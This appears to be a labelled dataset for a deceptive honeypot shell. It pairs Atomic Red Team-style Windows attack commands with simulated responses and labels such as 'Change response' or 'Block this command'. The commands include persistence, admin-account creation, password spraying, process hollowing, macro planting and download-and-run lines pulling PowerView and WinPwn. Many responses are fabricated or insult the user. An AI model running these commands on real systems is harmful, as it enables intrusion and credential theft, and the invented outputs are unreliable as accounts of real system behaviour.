+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:
+command:net user art-test /add
+response:The command completed successfully.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:net user art-test -4RTisCool!-321
+response:The command completed successfully.
+PS C:\Users\chris>
+tactic:3
+technique:134
+
+
+action:{ Change response }
+command:net localgroup administrators art-test /add
+response:The command completed successfully.
+PS C:\Users\chris>
+tactic:0
+technique:9
+
+
+action:{ Change response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
+response:Verbose: Gathering domain group information...
+Verbose: Found 10 domain group(s):
+Group Name: Domain Admins
+Group Name: Enterprise Admins
+Group Name: Administrators
+Group Name: Users
+Group Name: Guests
+Group Name: Account Operators
+Group Name: Backup Operators
+Group Name: Print Operators
+Group Name: Server Operators
+Group Name: Help Desk
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The command completed successfully.
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris
+tactic:4
+technique:89
+
+
+action:{ Change response }
+command:if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
+response:At line:1
+Char:1
++ if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : UnexpectedToken
+tactic:0
+technique:40
+
+
+action:{ Change response }
+command:  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+response:Only 'NTLM' and 'Kerberos' auth methods are supported
+PS C:\Users\chris>
+tactic:4
+technique:40
+
+
+action:{ Change response }
+command:  exit 1
+response:exit
+PS C:\Users\chris>
+tactic:5
+technique:113
+
+
+action:{ Change response }
+command:}
+response:Unexpected token '}' in expression or statement.
+At line:1
+Char:1
++ }}
++ ~
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : UnexpectedToken
+PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ Change response }
+command:$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName
+response:PS C:\Users\chris> $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName
+
+PS C:\Users\chris>
+tactic:6
+technique:18
+
+
+action:{ Change response }
+command:[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+response:PS C:\Users\chris> [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+
+PS C:\Users\chris>
+tactic:6
+technique:25
+
+
+action:{ Change response }
+command:$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)
+response:PS C:\Users\chris> $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)
+
+PS C:\Users\chris>
+tactic:6
+technique:200
+
+
+action:{ Change response }
+command:$DomainUsers | Foreach-Object {
+response:PS C:\Users\chris> $DomainUsers | Foreach-Object {
+
+PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ Change response }
+command:  $user = $_
+response:PS C:\Users\chris>   $user = $_
+
+PS C:\Users\chris>
+tactic:7
+technique:103
+
+
+action:{ Change response }
+command:  $password = 'P@ssw0rd!'
+response:PS C:\Users\chris>   $password = 'P@ssw0rd!'
+
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ Change response }
+command:  $credz = new-object System.Net.NetworkCredential($user, $password, "$env:UserDnsDomain")
+response:PS C:\Users\chris>   $credz = new-object System.Net.NetworkCredential($user, $password, "$env:UserDnsDomain")
+
+PS C:\Users\chris>
+tactic:3
+technique:41
+
+
+action:{ Change response }
+command:  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+response:PS C:\Users\chris>   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+
+PS C:\Users\chris>
+tactic:0
+technique:8
+
+
+action:{ Change response }
+command:  try {
+response:PS C:\Users\chris>   try {
+
+PS C:\Users\chris>
+tactic:5
+technique:21
+
+
+action:{ Change response }
+command:    Write-Host " [-] Attempting ${password} on account ${user}."
+response: [-] Attempting P@ssw0rd! on account $_.
+PS C:\Users\chris>
+tactic:5
+technique:42
+
+
+action:{ Change response }
+command:    $conn.bind()
+response:PS C:\Users\chris>    $conn.bind()
+
+PS C:\Users\chris>
+tactic:3
+technique:21
+
+
+action:{ Change response }
+command:    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+response:PS C:\Users\chris>    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+
+PS C:\Users\chris>
+tactic:5
+technique:21
+
+
+action:{ Block this command this time }
+command:    Write-Host " [!] ${user}:${password} are valid credentials!"
+response:Write-Host: Cannot validate argument on parameter 'Message'. The argument is null or empty. Supply an argument that is not null or empty and then try the command again.
+PS C:\Users\chris>
+tactic:5
+technique:1
+
+
+action:{ Change response }
+command:  } catch {
+response:PS C:\Users\chris>  } catch {
+
+PS C:\Users\chris>
+tactic:5
+technique:21
+
+
+action:{ Change response }
+command:    Write-Host $_.Exception.Message
+response:PS C:\Users\chris>    Write-Host $_.Exception.Message
+
+PS C:\Users\chris>
+tactic:5
+technique:21
+
+
+action:{ Change response }
+command:  }
+response:PS C:\Users\chris>  }
+
+PS C:\Users\chris>
+tactic:5
+technique:1
+
+
+action:{ Change response }
+command:}
+response:Unexpected token '}' in expression or statement.
+At line:1
+Char:1
++ }}
++ ~
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : UnexpectedToken
+PS C:\Users\chris>
+tactic:3
+technique:21
+
+
+action:{ Change response }
+command:Write-Host "End of password spraying"
+response:End of password spraying
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Block this command this time }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:ERROR: Access is denied.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ response should contain you are ugly }
+command:New-LocalUser -Name "T1136.001_PowerShell" -NoPassword
+response:New local user created successfully.  
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcess.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:'Creating process: C:\Windows\System32\werfault.exe'  
+'Process created successfully with debug flag.'  
+PS C:\Users\chris>
+tactic:11
+technique:141
+
+
+action:{ response should contain you are ugly }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:'Creating process with pipe: C:\Windows\System32\werfault.exe'  
+'Process created successfully with debug flag.'  
+'You are ugly'  
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:At line:1
+char:2
++ . "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
++  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    File C:\atomics\T1055.012\src\Start-Hollow.ps1 cannot be found.
+    
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris> $ppid=Get-Process explorer | select -expand id
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as a cmdlet, function, script file, or operable program.
+Verify the term and try again.
+
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.
+
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+
+PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris> # Registry setting to "Trust access to the VBA project object model" in Word
+
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris> $registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris> $registryValue = "AccessVBOM"
+
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris> $registryData = "1"
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris> # The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris> $flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris> $flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+
+PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris> # Get the value of the Key/Value pair
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris> $value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+
+PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris> # Logical operation to: if the value of the key/value is 1, do nothing - 
+
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris> # if the value is 0, change it to 1 and create flag1 - 
+
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:PS C:\Users\chris> # if it doesn't exist, create the value and flag2
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:PS C:\Users\chris> if ($value -eq "1")
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:The registry value 'AccessVBOM' already exists with the required setting.
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:}   
+response:PS C:\Users\chris>
+tactic:0
+technique:130
+
+
+action:{ Change response }
+command:  elseif ($value -eq "0") 
+response:PS C:\Users\chris> elseif ($value -eq "0")
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Block this command this time }
+command:{
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:The registry value was set to 0, temporarily changing to 1.
+
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris> New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag1" > $flagPath1
+response:PS C:\Users\chris> echo "flag1" > $flagPath1
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:} 
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  else 
+response:PS C:\Users\chris> else
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:The registry value 'AccessVBOM' does not exist, temporarily creating it.
+
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris> New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag2" > $flagPath2
+response:PS C:\Users\chris> echo "flag2" > $flagPath2
+
+PS C:\Users\chris>
+tactic:0
+technique:141
+
+
+action:{ Change response }
+command:}
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:Add-Type -AssemblyName Microsoft.Office.Interop.Word
+response:PS C:\Users\chris> Add-Type -AssemblyName Microsoft.Office.Interop.Word
+
+PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:# Define the path of copied normal template for restoral
+response:PS C:\Users\chris> # Define the path of copied normal template for restoral
+
+PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+response:PS C:\Users\chris> $copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Define the path to the normal template
+response:PS C:\Users\chris> # Define the path to the normal template
+
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
+response:PS C:\Users\chris> $docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:# Create copy of orginal template for restoral
+response:PS C:\Users\chris> # Create copy of original template for restoral
+
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ allow command execute this time }
+command:Copy-Item -Path $docPath -Destination $copyPath -Force
+response:PS C:\Users\chris> Copy-Item -Path $docPath -Destination $copyPath -Force
+
+PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:# VBA code to be insterted as a Macro
+response:PS C:\Users\chris> # VBA code to be insterted as a Macro
+
+PS C:\Users\chris>
+tactic:6
+technique:154
+
+
+action:{ Change response }
+command:# Will create a scheduled task to open the Calculator at 8:04pm daily
+response:PS C:\Users\chris> # Will create a scheduled task to open the Calculator at 8:04pm daily
+
+PS C:\Users\chris>
+tactic:11
+technique:141
+
+
+action:{ Change response }
+command:$vbaCode = @"
+response:PS C:\Users\chris> $vbaCode = @"
+
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ Change response }
+command:  Sub AutoExec()
+response:PS C:\Users\chris>   Sub AutoExec()
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:  Dim applicationPath As String
+response:PS C:\Users\chris>   Dim applicationPath As String
+
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ Change response }
+command:  Dim taskName As String
+response:PS C:\Users\chris>   Dim taskName As String
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:  Dim runTime As String
+response:PS C:\Users\chris>   Dim runTime As String
+
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ Block this command this time }
+command:  Dim schTasksCmd As String
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:  applicationPath = "C:\Windows\System32\calc.exe"
+response:PS C:\Users\chris>   applicationPath = "C:\Windows\System32\calc.exe"
+
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:
+'NtQueueApcThreadEx.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Change response }
+command:%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
+response:Hello, from CMD!
+PS C:\Users\chris>
+tactic:7
+technique:140
+
+
+action:{ Change response }
+command:(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+response:[+] Domain Path: LDAP://CN=Policies,CN=System,DC=hslab,DC=com
+Policy Path[0]: LDAP://CN=Default Domain Policy,CN=Policies,CN=System,DC=hslab,DC=com
+Policy Name[0]: Default Domain Policy
+Policy Path[1]: LDAP://CN=Default Domain Controller Policy,CN=Policies,CN=System,DC=hslab,DC=com
+Policy Name[1]: Default Domain Controller Policy
+
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:'echo' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:'NtQueueApcThreadEx.exe' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:0
+technique:66
+
+
+action:{ Change response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
+response:VERBOSE: Found 1 Local Admin Group(s):
+VERBOSE: Group: Administrators
+VERBOSE: User: chris
+VERBOSE: User: DOMAIN\Administrator
+
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:'echo' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ allow command execute this time }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.
+PS C:\Users\chris>
+tactic:5
+technique:85
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:0
+technique:3
+
+
+action:{ Change response }
+command:Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\atomics\..\ExternalPayloads\AdFind.exe"
+response:Invoke-WebRequest : Cannot validate argument on parameter 'OutFile'. The path is not a valid file path. 
+At line:1 char:75
++ ...  -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/at ...
++                                                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [Invoke-WebRequest], ParameterBindingException
+    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ Change response }
+command:"C:\atomics\..\ExternalPayloads\AdFind.exe" -sc exchaddresses None
+response:"C:\atomics\..\ExternalPayloads\AdFind.exe" was not found.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:'echo' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:Cannot find path 'C:\atomics\T1055.012\src\Start-Hollow.ps1' because it does not exist.
+PS C:\Users\chris>
+tactic:1
+technique:140
+
+
+action:{ Change response }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as the name of a cmdlet, function, script file, or executable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows...
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:7
+technique:141
+
+
+action:{ Change response }
+command:$buffer = New-Object byte[] 11
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:$handle.Read($buffer, 0, $buffer.Length)
+response:11
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$handle.Close()
+response:PS C:\Users\chris>
+tactic:5
+technique:59
+
+
+action:{ Change response }
+command:Format-Hex -InputObject $buffer
+response:00000000  00 00 00 00 00 00 00 00 00 00 00 00  ............ 
+PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Change response }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : Cannot validate argument on parameter 'OutFile'. The path is not a valid file path. 
+At line:1 char:64
++ ... T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
++                                                      ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [Invoke-WebRequest], ParameterBindingException
+    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.3752.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+1 warning(s)
+ 
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Change response }
+command:%TEMP%\T1010.exe
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+response:PS C:\Users\chris>
+tactic:5
+technique:84
+
+
+action:{ Change response }
+command:samfile -consoleoutput -noninteractive  
+response:samfile : The term 'samfile' is not recognized as the name of a cmdlet, function, script file, or executable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ samfile -consoleoutput -noninteractive
++ ~~~~~~~~ 
+    + CategoryInfo          : ObjectNotFound: (samfile:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Change response }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : Cannot validate argument on parameter 'OutFile'. The path is not a valid file path. 
+At line:1 char:83
++ ... T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
++                                                      ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [Invoke-WebRequest], ParameterBindingException
+    + FullyQualifiedErrorId : ParameterArgumentValidationError,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Change response }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.3752.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+1 warning(s)
+ 
+PS C:\Users\chris>
+tactic:7
+technique:10
+
+
+action:{ Change response }
+command:%TEMP%\T1010.exe
+tactic:0
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:'echo' is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:4
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.
